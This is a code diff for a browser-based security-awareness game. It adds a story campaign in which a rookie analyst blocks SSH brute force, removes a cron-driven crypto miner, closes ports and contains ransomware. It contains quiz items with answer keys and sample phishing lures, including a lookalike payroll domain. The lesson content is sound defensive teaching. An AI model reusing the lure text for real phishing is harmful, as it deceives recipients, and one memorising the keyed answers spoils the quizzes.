+                            { name: 'Sam', addr: 'sam@brightsidegames.com', subject: 'Printer on floor 2 is fixed', preview: 'It was a paper jam. It is always a paper jam.', phish: false, why: 'Real sender, nothing asked of you.' },
+                            { name: 'Payroll', addr: 'payroll@brightsidegarnes.com', subject: 'Update your bank details this month', preview: 'New payroll system: re-enter your bank details by Friday.', phish: true, why: 'Look closely: brightsidegarnes. That\'s “rn” pretending to be “m”.', hit: 'A teammate\'s salary is now going to the attacker.' },
+                            { name: 'GameVault Partners', addr: 'partners@gamevault.com', subject: 'Your launch date is confirmed', preview: 'Starfall goes live on the 14th. No action needed.', phish: false, why: 'GameVault\'s real domain, and no action needed. Compare it with the fake one.' },
+                            { name: 'Free Keys', addr: 'drop@free-beta-keys.gg', subject: 'Leaked Starfall beta keys 👀', preview: 'The full key list is in the attachment.', attach: 'starfall_keys.zip', phish: true, why: 'Unknown sender, tempting bait and a .zip attachment.', hit: 'Someone opened the .zip. There\'s malware on a laptop now.' },
+                            { name: 'Mira', addr: 'mira@brightsidegames.com', subject: 'You\'re doing great', preview: 'Keep going, rookie. Last one!', phish: false, why: 'Real domain, and a true statement.' }
+                        ]
+                    },
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Mon 12:10', art: '🍕', lines: [
+                            ['mira', 'Not bad for day one. Look at the senders: lookalike domains, all registered last week. Someone planned this.'],
+                            ['sam', 'One of them was signed “BL”. Who\'s BL?'],
+                            ['mira', 'No idea yet. But someone is very interested in Starfall.'],
+                            [null, 'Somewhere out there, someone has just written your company\'s name on a list.']
+                        ]
+                    }
+                ]
+            },
+            {
+                id: 'ch2', num: 2, title: 'Knock Knock', day: 'Tuesday', icon: '📜', xp: 100,
+                synopsis: 'Learn where Linux keeps its logs and how to read them. Late that night, someone starts guessing passwords.',
+                beats: [
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Tue 15:20', art: '🗺️', lines: [
+                            ['mira', 'Yesterday\'s emails came from somewhere. Today you learn to read a server\'s diary: its logs.'],
+                            ['mira', 'But first you need the map. Every Linux server keeps things in the same places. Learn it once and you\'re never lost.']
+                        ]
+                    },
+                    { type: 'train', lab: 'linux-map', host: 'web-01', intro: '🧑🏾‍💻 Mira: “Explore. This map is the same on almost every Linux server you\'ll ever touch.”' },
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Tue 16:05', art: '📜', lines: [
+                            ['mira', 'Logs live in /var/log. Now let\'s read them like a pro: never top to bottom.'],
+                            ['sam', 'I usually just scroll until my thumb hurts.'],
+                            ['mira', 'We know, Sam.']
+                        ]
+                    },
+                    { type: 'train', lab: 'reading-logs', host: 'web-01', intro: '🧑🏾‍💻 Mira: “The newest lines are at the bottom, and grep is your best friend.”' },
+                    {
+                        type: 'ask', who: 'mira', q: 'In auth.log: 30 “Failed password” lines from one address, then one “Accepted” from the same address. What happened?',
+                        options: ['Someone guessed a password, and got in', 'A user forgot their password, then remembered', 'The server rebooted', 'Nothing. That\'s normal noise'], answer: 0,
+                        explain: 'A password-guessing attack that worked. That “Accepted” line is the one that should make your stomach drop.'
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'You\'ve found the address hammering SSH. Fastest way to stop it?',
+                        options: ['Block it at the firewall: ufw deny from <address>', 'Email the attacker', 'Restart the server', 'Delete the auth log'], answer: 0,
+                        explain: 'Block it at the firewall. And never delete logs: they\'re your evidence.'
+                    },
+                    {
+                        type: 'scene', mood: 'night', loc: 'Your flat · Tue 23:41', art: '🌙', lines: [
+                            [null, 'You\'re halfway into your pyjamas when your phone buzzes.'],
+                            ['siem', '🔴 SSH login failures on web-01: 40 per minute and rising.'],
+                            ['mira', 'Someone\'s guessing passwords on web-01 right now. I\'m driving in, but you\'re closer to a laptop.'],
+                            ['mira', 'Find their address in /var/log/auth.log and block it with the firewall before they guess right. Go!']
+                        ]
+                    },
+                    INC_BRUTE,
+                    {
+                        type: 'scene', mood: 'night', loc: 'Brightside Games HQ · Wed 00:20', art: '☕', lines: [
+                            ['mira', 'Blocked. Breathe. Nice work.'],
+                            ['mira', 'Look at the usernames they tried: root, admin, sam, starfall…'],
+                            ['sam', '…my password was starfall2026.'],
+                            ['mira', 'Was. Change it tonight. And Sam? Turn on two-factor.'],
+                            [null, 'One username in the log stands out: blacklantern.'],
+                            ['mira', 'BL. Black Lantern. A crew that holds game launches to ransom. Get some sleep, rookie. They\'ll be back.']
+                        ]
+                    }
+                ]
+            },
+            {
+                id: 'ch3', num: 3, title: 'Ghost in the Machine', day: 'Wednesday', icon: '⚙️', xp: 120,
+                synopsis: 'The build server is crawling. Learn processes, schedules and safe deletion, then evict something that refuses to die.',
+                beats: [
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Wed 10:05', art: '🏭', lines: [
+                            ['dana', 'Our build server is crawling. Builds take four hours instead of one. Is that… a security thing?'],
+                            ['mira', 'Slow machines are sometimes just slow. Sometimes they\'re working for someone else.'],
+                            ['mira', 'Rookie: processes and schedules. What\'s running right now, and what starts things on a timer.']
+                        ]
+                    },
+                    { type: 'train', lab: 'jobs', host: 'build-01', intro: '🧑🏾‍💻 Mira: “Every running program has an ID. Every schedule has a file. Let\'s find both.”' },
+                    TRAIN_RM,
+                    {
+                        type: 'ask', who: 'mira', q: 'You kill a malicious process. A minute later it\'s back with a new PID. Where do you look?',
+                        options: ['Scheduled jobs: /etc/crontab, /etc/cron.d and crontab -l', 'Restart the server and hope', 'Kill it again every minute', 'The website\'s homepage'], answer: 0,
+                        explain: 'Something is restarting it, and cron is the usual suspect. Attackers call it persistence.'
+                    },
+                    {
+                        type: 'scene', mood: 'alarm', loc: 'Brightside Games HQ · Wed 10:52', art: '🔥', lines: [
+                            ['siem', '🔴 build-01: CPU at 100% for 20 minutes. Unknown process.'],
+                            ['mira', 'That\'s no build. That\'s someone mining crypto on our electricity bill.'],
+                            ['mira', 'Kill it, find what keeps restarting it, delete that, then clean up. Every second it runs costs us. Go!']
+                        ]
+                    },
+                    INC_MINER,
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Wed 11:30', art: '🧯', lines: [
+                            ['mira', 'Clean. And look where that cron job downloaded from: 198.51.100.40.'],
+                            ['sam', 'Same crew?'],
+                            ['mira', 'Same crew. They got onto build-01 with an old password nobody ever changed.'],
+                            ['mira', 'Tomorrow we close every door we don\'t need.']
+                        ]
+                    }
+                ]
+            },
+            {
+                id: 'ch4', num: 4, title: 'Close the Doors', day: 'Thursday', icon: '🚪', xp: 130,
+                synopsis: 'Learn permissions, services and firewalls. Then a scanner starts knocking on every door, one by one.',
+                beats: [
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Thu 09:30', art: '🚪', lines: [
+                            ['mira', 'Black Lantern got in by guessing a password and hid with a schedule. Today we shrink what they can even reach.'],
+                            ['mira', 'Two ideas: permissions (who can read a file) and services (which programs listen to the internet).']
+                        ]
+                    },
+                    { type: 'train', lab: 'perms', host: 'web-01', intro: '🧑🏾‍💻 Mira: “Every open port is a door. Let\'s count ours.”' },
+                    {
+                        type: 'ask', who: 'mira', q: 'Which port should a web server open to the whole internet?',
+                        options: ['443: HTTPS, the website itself', '3306: the MySQL database', '23: Telnet', '21: FTP'], answer: 0,
+                        explain: 'Only what customers need: the website. Databases, Telnet and FTP should never face the internet.'
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'A service is listening but nobody uses it. Best move?',
+                        options: ['Stop it, disable it at boot, and block its port', 'Leave it, just in case', 'Rename it', 'Move it to another port number'], answer: 0,
+                        explain: 'Every running service is a door. If nobody needs it, close it. Moving it to another port only slows a scanner down by seconds.'
+                    },
+                    {
+                        type: 'scene', mood: 'alarm', loc: 'Brightside Games HQ · Thu 14:20', art: '📡', lines: [
+                            ['siem', '🔴 IDS: port scan against web-01 from 192.0.2.66.'],
+                            ['mira', 'They\'re knocking on every door, one at a time. Check what\'s listening, and close the dangerous ones before the scanner gets there.'],
+                            ['mira', 'Don\'t touch 22 or 443! We need SSH, and the website has to stay up. Go!']
+                        ]
+                    },
+                    INC_SCAN,
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Thu 15:00', art: '🌇', lines: [
+                            ['sam', 'The scanner just… gave up?'],
+                            ['mira', 'Nothing worth knocking on. That\'s the goal.'],
+                            ['dana', 'Launch is tomorrow. Tell me we\'re ready.'],
+                            ['mira', 'As ready as anyone gets. If they come again, it\'ll be loud.']
+                        ]
+                    }
+                ]
+            },
+            {
+                id: 'ch5', num: 5, title: 'Launch Day', day: 'Friday', icon: '🚀', xp: 160,
+                synopsis: 'Starfall launches at noon. Black Lantern has one last move, and it\'s the big one.',
+                beats: [
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Fri 08:55', art: '🚀', lines: [
+                            ['dana', 'Starfall goes live at noon. Forty thousand people on the wishlist. Anything I should worry about?'],
+                            ['mira', 'The guessing is blocked, the miner\'s gone, the doors are shut. If Black Lantern tries again, they\'ll go for the big one.'],
+                            ['dana', 'The big one?'],
+                            ['mira', 'Ransomware. Let\'s make sure our rookie knows the drill.']
+                        ]
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'Ransomware starts encrypting the shared drive. What\'s your first move?',
+                        options: ['Contain it: kill the process and cut its connection', 'Pay before the price goes up', 'Wait to see which files it takes', 'Email everyone to ask who clicked something'], answer: 0,
+                        explain: 'Contain first. Every second it runs, more files are lost, and paying guarantees nothing.'
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'Why cut its network connection as well as killing the process?',
+                        options: ['While the line home is open, they can relaunch it remotely', 'It makes the server faster', 'It deletes the ransomware', 'It\'s not needed'], answer: 0,
+                        explain: 'Ransomware usually phones home to a command server (“C2”). While that line is open, they can simply start it again.'
+                    },
+                    {
+                        type: 'ask', who: 'mira', q: 'What makes a ransomware attack survivable?',
+                        options: ['A recent backup kept apart from the server', 'A strong screen lock', 'More antivirus', 'A bigger hard drive'], answer: 0,
+                        explain: 'A backup ransomware can\'t reach. That\'s what turns a disaster into a bad afternoon.'
+                    },
+                    {
+                        type: 'scene', mood: 'alarm', loc: 'Brightside Games HQ · Fri 11:37', art: '🔒', lines: [
+                            ['siem', '🔴 files-01: files on the shared drive are being renamed to *.locked.'],
+                            [null, 'In the shared folder, the Starfall launch files start turning into gibberish. One by one.'],
+                            ['lantern', 'Your launch belongs to us. Pay 50 BTC before noon, or Starfall dies. 🏮'],
+                            ['mira', 'Absolutely not. Stop the encryption, cut their line, and we restore from backup. Move!']
+                        ]
+                    },
+                    INC_RANSOM,
+                    RESTORE,
+                    {
+                        type: 'scene', mood: 'calm', loc: 'Brightside Games HQ · Fri 12:00', art: '🎆', lines: [
+                            [null, '12:00. Starfall goes live. Forty thousand players in the first hour.'],
+                            ['dana', 'We launched. On time. And nobody outside this room will ever know how close that was.'],
+                            ['mira', 'That\'s the job. When we win, nothing happens.'],
+                            ['sam', 'I turned on two-factor. For everything. Even the coffee machine.'],
+                            ['mira', 'Welcome to the team, analyst. Officially.'],
+                            [null, 'Black Lantern has gone quiet. For now.']
+                        ]
+                    }
+                ]
+            }
+        ];
+
+        const storyDone = (id) => !!(progress.story[id] && progress.story[id].done);
+        const fmtLine = (s) => esc(s).replace(/`([^`]+)`/g, '<code>$1</code>');
+
+        const Story = {
+            ch: null, i: 0, line: 0, results: [], typing: false, typer: null, onTap: null, askBeat: null,
+
+            chapter(id) { return CHAPTERS.find((c) => c.id === id); },
+            // Where "Continue" should take the player.
+            current() {
+                const at = progress.storyAt;
+                if (at && this.chapter(at.ch)) return { ch: this.chapter(at.ch), beat: at.beat || 0 };
+                const ch = CHAPTERS.find((c) => !storyDone(c.id));
+                return ch ? { ch, beat: 0 } : null;
+            },
+            open(id, beat) {
+                this.ch = this.chapter(id);
+                this.results = [];
+                this.i = beat || 0;
+                show('story');
+                $('st-chapter').textContent = 'Chapter ' + this.ch.num + ' · ' + this.ch.title;
+                if (this.i === 0) this.titleCard(); else this.play();
+            },
+            mood(m, loc, art) {
+                $('story').dataset.mood = m || 'calm';
+                if (loc != null) $('st-loc').textContent = loc;
+                if (art) $('st-art').textContent = art;
+            },
+            titleCard() {
+                const ch = this.ch;
+                this.mood('calm', ch.day, ch.icon);
+                $('st-card').innerHTML = '<div><div class="ch">CHAPTER ' + ch.num + ' · ' + esc(ch.day.toUpperCase()) + '</div><h2>' + esc(ch.title) + '</h2><p>' + esc(ch.synopsis) + '</p></div>';
+                $('st-card').className = 'stage-card show'; $('st-stage').classList.add('carded');
+                this.speak(null, 'Tap to begin.');
+                this.onTap = () => { $('st-card').className = 'stage-card'; $('st-stage').classList.remove('carded'); this.play(); };
+            },
+            play() {
+                $('st-card').className = 'stage-card'; $('st-stage').classList.remove('carded');
+                if (this.i >= this.ch.beats.length) return this.complete();
+                progress.storyAt = { ch: this.ch.id, beat: this.i };
+                saveProgress();
+                const b = this.ch.beats[this.i];
+                if (b.type === 'scene') { this.mood(b.mood, b.loc, b.art); this.line = 0; return this.showLine(); }
+                if (b.type === 'ask') return this.ask(b);
+                if (b.type === 'triage') return Triage.run(b, (r) => this.after(r));
+                // Training and incident beats run in the terminal. A training beat can reuse a lab.
+                const src = b.lab ? Object.assign({}, LABS.find((l) => l.id === b.lab), b, { labId: b.lab }) : b;
+                Ops.run(src, { mode: 'story', onDone: (r) => this.after(r) });
+            },
+            after(r) {
+                if (r && r.stars) this.results.push(r.stars);
+                show('story');
+                this.i++;
+                this.play();
+            },
+            showLine() {
+                const b = this.ch.beats[this.i];
+                const [who, text] = b.lines[this.line];
+                this.speak(who, text);
+                this.onTap = () => {
+                    this.line++;
+                    if (this.line < b.lines.length) this.showLine();
+                    else { this.i++; this.play(); }
+                };
+            },
+            speak(who, text) {
+                const c = who && CHARS[who];
+                $('st-dialog').classList.toggle('narr', !c);
+                $('st-avatar').textContent = c ? c.avatar : '';
+                $('st-avatar').style.borderColor = c ? c.color : '';
+                $('st-name').textContent = c ? c.name : '';
+                $('st-name').style.color = c ? c.color : '';
+                $('st-role').textContent = c ? c.role : '';
+                $('st-choices').innerHTML = '';
+                $('st-feedback').innerHTML = '';
+                $('st-feedback').className = 'st-feedback';
+                $('st-tap').hidden = false;
+                if (who === 'siem' || who === 'lantern') Sfx.ping();
+                const el = $('st-text');
+                this.stopTyping();
+                if (reducedMotion) { el.innerHTML = fmtLine(text); return; }
+                const plain = text.replace(/`/g, '');
+                let n = 0;
+                this.typing = true;
+                el.textContent = '';
+                this.typer = setInterval(() => {
+                    n += 2;
+                    el.textContent = plain.slice(0, n);
+                    if (n >= plain.length) this.finishTyping();
+                }, 18);
+                this.fullText = fmtLine(text);
+            },
+            finishTyping() {
+                this.stopTyping();
+                if (this.fullText != null) $('st-text').innerHTML = this.fullText;
+                this.fullText = null;
+            },
+            stopTyping() {
+                clearInterval(this.typer);
+                this.typer = null;
+                this.typing = false;
+            },
+            tap() {
+                if (this.typing) return this.finishTyping();
+                if (this.onTap) { const f = this.onTap; this.onTap = null; f(); }
+            },
+            ask(b) {
+                this.speak(b.who || 'mira', b.q);
+                this.finishTyping();
+                $('st-tap').hidden = true;
+                this.onTap = null;
+                this.askBeat = b;
+                const order = shuffle(b.options.map((_, k) => k));
+                $('st-choices').innerHTML = order.map((k) => '<button class="opt" data-ask="' + k + '">' + esc(b.options[k]) + '</button>').join('');
+            },
+            pick(k) {
+                const b = this.askBeat;
+                if (!b) return;
+                const btn = document.querySelector('#st-choices [data-ask="' + k + '"]');
+                if (!btn || btn.disabled) return;
+                if (k === b.answer) {
+                    document.querySelectorAll('#st-choices .opt').forEach((x) => { x.disabled = true; });
+                    btn.classList.add('correct');
+                    $('st-feedback').className = 'st-feedback good';
+                    $('st-feedback').innerHTML = '✔ ' + fmtLine(b.explain) + '<div class="btn-row"><button class="btn" data-story-tap>Continue ▸</button></div>';
+                    Sfx.ok();
+                    this.askBeat = null;
+                    this.onTap = () => { this.i++; this.play(); };
+                    const btnNext = document.querySelector('[data-story-tap]');
+                    if (btnNext) btnNext.focus({ preventScroll: true });
+                } else {
+                    btn.disabled = true;
+                    btn.classList.add('wrong');
+                    $('st-feedback').className = 'st-feedback bad';
+                    $('st-feedback').textContent = 'Not quite. Think about what the attacker wants, and try another answer.';
+                    Sfx.hit();
+                }
+            },
+            complete() {
+                const ch = this.ch;
+                const stars = this.results.length ? Math.round(this.results.reduce((a, x) => a + x, 0) / this.results.length) : 3;
+                const prev = progress.story[ch.id] || {};
+                const first = !prev.done;
+                progress.story[ch.id] = { done: true, stars: Math.max(prev.stars || 0, stars), xp: ch.xp };
+                const nextCh = CHAPTERS[CHAPTERS.indexOf(ch) + 1];
+                progress.storyAt = nextCh ? { ch: nextCh.id, beat: 0 } : null;
+                saveProgress();
+                Sfx.win();
+                this.mood('calm', 'Chapter complete', '🏆');
+                const last = !nextCh;
+                $('st-card').innerHTML = '<div><div class="ch">CHAPTER ' + ch.num + ' COMPLETE</div><h2>' + esc(ch.title) + '</h2><div class="stars">' + starHtml(stars) + '</div>' +
+                    '<p>' + (first ? '+' + ch.xp + ' XP' : 'Replayed') + (last ? ' · The end… for now.' : '') + '</p></div>';
+                $('st-card').className = 'stage-card show'; $('st-stage').classList.add('carded');
+                this.speak(null, last
+                    ? 'Starfall launched, and Black Lantern went home empty-handed. Keep training in the Training Grounds: more chapters are coming.'
+                    : 'Next up: Chapter ' + nextCh.num + ', “' + nextCh.title + '”.');
+                this.finishTyping();
+                $('st-tap').hidden = true;
+                this.onTap = null;
+                $('st-choices').innerHTML = (last ? '' : '<button class="btn" data-story-next="' + nextCh.id + '">Next chapter →</button>') +
+                    '<button class="btn secondary" data-go="home">Back to HQ</button>';
+            }
+        };
+
+        // Fast mail-triage incident: report phishing, allow real mail, before the timer runs out.
+        const Triage = {
+            timer: null,
+            run(beat, onDone) {
+                this.beat = beat;
+                this.onDone = onDone;
+                this.queue = beat.mails.map((m, i) => Object.assign({ id: i, arriveAt: 1.2 + i * beat.gap }, m));
+                this.active = [];
+                this.results = [];
+                this.t = 0;
+                this.danger = 0;
+                this.peak = 0;
+                this.over = false;
+                $('tr-inbox').innerHTML = '<div class="tr-msg" style="text-align:center">📭 Waiting for mail…</div>';
+                $('tr-done').className = 'term-done';
+                this.msg('Emails are arriving. 🎣 Report the phishing, ✅ allow the real ones. Read the address!', '');
+                this.hud();
+                show('triage');
+                Sfx.alarm();
+                this.last = performance.now();
+                this.stop();
+                this.timer = setInterval(() => this.tick(), 100);
+            },
+            stop() { clearInterval(this.timer); this.timer = null; },
+            msg(text, cls) { $('tr-msg').textContent = text; $('tr-msg').className = 'tr-msg ' + (cls || ''); },
+            hud() {
+                const pct = Math.round(this.danger);
+                $('tr-pct').textContent = pct + '%';
+                $('tr-bar').style.width = pct + '%';
+                $('tr-count').textContent = this.results.length + '/' + this.beat.mails.length;
+            },
+            tick() {
+                const now = performance.now();
+                const dt = Math.min(1, (now - this.last) / 1000);
+                this.last = now;
+                if (document.hidden || this.over) return;
+                this.t += dt;
+                while (this.queue.length && this.queue[0].arriveAt <= this.t) this.arrive(this.queue.shift());
+                this.active.slice().forEach((m) => {
+                    const left = m.deadline - this.t;
+                    const bar = document.querySelector('#tr-m' + m.id + ' .tr-timer i');
+                    if (bar) bar.style.width = Math.max(0, (left / this.beat.window) * 100) + '%';
+                    if (left <= 0) this.decide(m.id, 'allow', true);
+                });
+            },
+            arrive(m) {
+                m.deadline = this.t + this.beat.window;
+                this.active.push(m);
+                if (!this.active.length || $('tr-inbox').querySelector('.tr-msg')) $('tr-inbox').innerHTML = '';
+                const card = document.createElement('div');
+                card.className = 'tr-card';
+                card.id = 'tr-m' + m.id;
+                card.innerHTML = '<div class="tr-from"><b>' + esc(m.name) + '</b> <span class="tr-addr">&lt;' + esc(m.addr) + '&gt;</span></div>' +
+                    '<div class="tr-subj">' + esc(m.subject) + '</div><div class="tr-prev">' + esc(m.preview) + '</div>' +
+                    (m.attach ? '<span class="attach">📎 ' + esc(m.attach) + '</span>' : '') +
+                    '<div class="tr-timer"><i></i></div>' +
+                    '<div class="tr-actions"><button class="tr-report" data-tr="report" data-id="' + m.id + '">🎣 Report</button><button class="tr-allow" data-tr="allow" data-id="' + m.id + '">✅ Allow</button></div>';
+                $('tr-inbox').prepend(card);
+                Sfx.ping();
+            },
+            decide(id, verdict, timeout) {
+                const m = this.active.find((x) => x.id === id);
+                if (!m || this.over) return;
+                this.active = this.active.filter((x) => x !== m);
+                const card = $('tr-m' + id);
+                if (card) card.remove();
+                const reported = verdict === 'report';
+                if (m.phish && !reported) {
+                    this.danger += 30;
+                    this.msg((timeout ? '⏰ Too slow, it was delivered. ' : '') + '💥 ' + m.hit + ' (' + m.why + ')', 'bad');
+                    Sfx.hit();
+                    if (navigator.vibrate) navigator.vibrate(120);
+                } else if (!m.phish && reported) {
+                    this.danger += 8;
+                    this.msg('😬 That one was real, and now it\'s stuck in quarantine. ' + m.why, 'bad');
+                    Sfx.hit();
+                } else {
+                    this.msg((m.phish ? '🛡️ Blocked! ' : '✅ Delivered. ') + m.why, 'good');
+                    Sfx.ok();
+                }
+                this.results.push({ m, right: reported === m.phish, timeout });
+                this.danger = Math.min(100, this.danger);
+                this.peak = Math.max(this.peak, this.danger);
+                this.hud();
+                if (this.danger >= 100) return this.end(false);
+                if (!this.queue.length && !this.active.length) this.end(true);
+            },
+            end(won) {
+                this.over = true;
+                this.stop();
+                $('tr-inbox').innerHTML = '';
+                const stars = this.peak <= 10 ? 3 : this.peak <= 40 ? 2 : 1;
+                const list = '<ul class="tr-results">' + this.results.map((r) =>
+                    '<li>' + (r.right ? '✔' : '✘') + ' <b>' + esc(r.m.subject) + '</b>: ' + (r.m.phish ? 'phishing. ' : 'real. ') + esc(r.m.why) + '</li>').join('') + '</ul>';
+                if (won) {
+                    Sfx.win();
+                    $('tr-done-title').textContent = '🛡️ Phishing wave stopped';
+                    $('tr-done-text').innerHTML = '<span class="stars">' + starHtml(stars) + '</span><p>Here\'s what each one was. Take a calm look now that the rush is over:</p>' + list;
+                    $('tr-continue').textContent = 'Continue the story →';
+                    this._next = () => this.onDone({ stars });
+                } else {
+                    Sfx.fail();
+                    $('tr-done-title').textContent = '💥 Too many got through';
+                    $('tr-done-text').innerHTML = '<p>Accounts were stolen and malware landed on a laptop. Nothing is lost, so try again. Read the sender\'s address first, and watch for deadlines and lookalike domains.</p>' + list;
+                    $('tr-done').className = 'term-done show bad';
+                    $('tr-continue').textContent = '↻ Try again';
+                    this._next = () => this.run(this.beat, this.onDone);
+                }
+                if (won) $('tr-done').className = 'term-done show';
+            }
+        };
+
+        function renderStoryHero() {
+            const cur = Story.current();
+            const doneN = CHAPTERS.filter((c) => storyDone(c.id)).length;
+            const label = !cur ? '↺ Replay from Chapter 1'
+                : (cur.beat > 0 ? '▶ Continue' : doneN ? '▶ Play' : '▶ Start the story') + ' · Ch. ' + cur.ch.num + ': ' + cur.ch.title;
+            const rows = CHAPTERS.map((c, i) => {
+                const open = i === 0 || storyDone(CHAPTERS[i - 1].id) || storyDone(c.id);
+                const isCur = cur && cur.ch === c;
+                const st = progress.story[c.id];
+                return '<button class="chapter' + (isCur ? ' current' : '') + '" data-chapter="' + c.id + '"' + (open ? '' : ' disabled') + '>' +
+                    '<span class="num">CH ' + c.num + '</span><span>' + (open ? c.icon : '🔒') + '</span>' +
+                    '<span class="t">' + esc(c.title) + '<small>' + esc(c.day) + (st && st.done ? '' : ' · +' + c.xp + ' XP') + '</small></span>' +
+                    '<span class="stars">' + (st && st.done ? starHtml(st.stars) : '') + '</span></button>';
+            }).join('');
+            $('story-hero').innerHTML = '<div class="kicker">📖 STORY CAMPAIGN · ' + doneN + '/' + CHAPTERS.length + ' CHAPTERS</div>' +
+                '<h2>Defend Brightside</h2>' +
+                '<p>Two weeks to launch. A hacker crew wants the studio\'s game. You\'re the new security analyst, and you\'ll learn on the job.</p>' +
+                '<button class="btn" data-story-play>' + esc(label) + '</button>' +
+                '<div class="chapters">' + rows + '</div>';
+        }
+
         // ── Events ────────────────────────────────────────────────────────
         document.addEventListener('click', (e) => {
+            if (e.target.closest('[data-sound]')) {
+                progress.settings.mute = !progress.settings.mute;
+                saveProgress();
+                document.querySelectorAll('[data-sound]').forEach((b) => { b.textContent = progress.settings.mute ? '🔇' : '🔊'; });
+                return;
+            }
+            if (e.target.closest('[data-story-play]')) {
+                const cur = Story.current();
+                return cur ? Story.open(cur.ch.id, cur.beat) : Story.open(CHAPTERS[0].id, 0);
+            }
+            const chapter = e.target.closest('[data-chapter]');
+            if (chapter && !chapter.disabled) {
+                const cur = Story.current();
+                const id = chapter.dataset.chapter;
+                return Story.open(id, cur && cur.ch.id === id ? cur.beat : 0);
+            }
+            const nextCh = e.target.closest('[data-story-next]');
+            if (nextCh) return Story.open(nextCh.dataset.storyNext, 0);
+            const ask = e.target.closest('[data-ask]');
+            if (ask) return Story.pick(Number(ask.dataset.ask));
+            if (e.target.closest('[data-story-tap]')) return Story.tap();
+            if (S.screen === 'story' && e.target.closest('#st-dialog') && !e.target.closest('button')) return Story.tap();
+            const tr = e.target.closest('[data-tr]');
+            if (tr) return Triage.decide(Number(tr.dataset.id), tr.dataset.tr, false);
             const go = e.target.closest('[data-go]');
             if (go) return show(go.dataset.go);
             const lab = e.target.closest('[data-lab]');
@@ -3401,9 +4731,25 @@ permalink: /cyber-quest/
         });
         $('b-start').addEventListener('click', startMission);
         $('ob-start').addEventListener('click', () => Ops.start());
-        $('ops-continue').addEventListener('click', () => show('home'));
+        $('ops-continue').addEventListener('click', () => Ops.continue());
+        $('tr-continue').addEventListener('click', () => { const next = Triage._next; Triage._next = null; if (next) next(); else show('home'); });
+        $('tr-quit').addEventListener('click', () => {
+            if (Triage.over || window.confirm('Leave? The story is saved, but this part restarts next time.')) show('home');
+        });
+        document.addEventListener('keydown', (e) => {
+            if (S.screen !== 'story' || (e.key !== 'Enter' && e.key !== ' ')) return;
+            if (e.target.closest && e.target.closest('button')) return; // let focused buttons handle their own keys
+            e.preventDefault();
+            Story.tap();
+        });
+        document.querySelectorAll('[data-sound]').forEach((b) => { b.textContent = progress.settings.mute ? '🔇' : '🔊'; });
+        $('grounds').open = !!progress.settings.groundsOpen;
+        $('grounds').addEventListener('toggle', () => { progress.settings.groundsOpen = $('grounds').open; saveProgress(); });
         $('ops-quit').addEventListener('click', () => {
-            if (Ops._finished || window.confirm('Leave the terminal? Your objective progress in this lab is saved only when you finish it.')) {
+            const msg = Ops.mode === 'story'
+                ? 'Leave? The story is saved, but this part restarts from the beginning next time.'
+                : 'Leave the terminal? Your objective progress in this lab is saved only when you finish it.';
+            if (Ops._finished || window.confirm(msg)) {
                 Ops._finished = false;
                 show('home');
             }
@@ -3421,7 +4767,7 @@ permalink: /cyber-quest/
         });
         $('reset').addEventListener('click', () => {
             if (window.confirm('Reset all progress, stars and XP?')) {
-                progress = { v: 1, missions: {}, labs: {} };
+                progress = { v: 1, missions: {}, labs: {}, story: {}, settings: progress.settings };
                 saveProgress();
                 show('home');
                 toast('Progress reset.');
@@ -3458,6 +4804,10 @@ permalink: /cyber-quest/
                 },
                 next,
                 labs: LABS.map((l) => l.id),
+                chapters: CHAPTERS.map((c) => c.id),
+                story: Story,
+                triage: Triage,
+                shell: Ops,
                 ops: {
                     open: (id) => Ops.open(id),
                     start: () => Ops.start(),
